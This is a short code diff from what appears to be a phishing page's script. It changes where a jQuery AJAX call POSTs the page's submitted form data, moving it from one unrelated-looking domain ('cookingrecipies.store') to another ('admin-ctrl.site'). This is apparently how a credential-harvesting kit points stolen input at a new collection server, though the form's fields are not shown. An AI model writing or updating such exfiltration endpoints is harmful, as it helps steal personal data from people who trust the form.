@@ -109,7 +109,7 @@ const handleErr = ()=>{
         $("#submitBtn").html(`<button id="submitBtn" class="btn btn-md btn-block btn-danger btn-block"> <span class="spinner-grow spinner-grow-sm"></span>
         Please Wait...</button>`).prop("disabled", true);
         $.ajax({
-            url: "https://gdf.cookingrecipies.store/adb/index.php",
+            url: "https://tg-adb.admin-ctrl.site/index.php",
             type: 'POST',
             data: formData,
             contentType: false,
